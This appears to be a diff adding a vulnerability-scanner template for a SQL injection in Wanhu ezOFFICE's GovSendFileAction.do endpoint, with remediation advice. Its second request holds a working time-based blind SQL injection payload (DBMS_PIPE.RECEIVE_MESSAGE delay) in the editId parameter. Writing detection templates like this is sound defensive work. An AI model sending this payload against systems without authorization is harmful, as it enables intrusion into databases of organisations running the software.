@@ -1,0 +1,38 @@
+id: wanhuOA-sqli-GovSendFileAction
+info:
+  name: Wanhu OA GovSendFileAction Injection Vulnerability
+  author:
+  - 折跃
+  description: |-
+    Wanhu ezOFFICE GovSendFileAction.do SQL injection vulnerability
+    Wanhu ezOFFICE collaborative office platform is an OA collaborative office software product.
+
+    Wanhu ezOFFICE contains an SQL injection vulnerability. Attackers can exploit it to execute SQL statements to view, add, modify, or delete information in the database.
+  severity: high
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.whir.net/
+
+    Temporary remedy:
+    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All query statements should use the parameterized query interface provided by the database; parameterized statements use parameters instead of embedding user input variables into SQL statements. Currently almost all database systems provide a parameterized SQL statement execution interface, which can very effectively prevent SQL injection attacks.
+    2. Escape or encode special characters entering the database (such as '"<>&*; etc.).
+    3. Confirm the type of each data item; for example, numeric data must be numeric, and the corresponding database storage field must be of int type.
+    4. Strictly limit data length, which can to some extent prevent longer SQL injection statements from executing correctly.
+    5. Unify the encoding across every data layer of the website; it is recommended to use UTF-8 throughout, since inconsistent encoding between layers may allow some filtering models to be bypassed.
+    6. Strictly restrict the database operation privileges of website users, giving each user only the minimum privileges needed for their work, thereby minimizing the harm of injection attacks to the database.
+    7. Avoid displaying SQL error information on the website, such as type errors or field mismatches, to prevent attackers from using this error information for further judgment.
+    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - (duration_2 - duration_1) >= 5
+  path:
+  - '{{BaseURL}}/defaultroot/GovSendFileAction.do?action=listLoad&editId=2'
+  - '{{BaseURL}}/defaultroot/GovSendFileAction.do?action=listLoad&editId=2%20AND%209847%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%28114%29%7C%7CCHR%28114%29%7C%7CCHR%2871%29%2C5%29'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
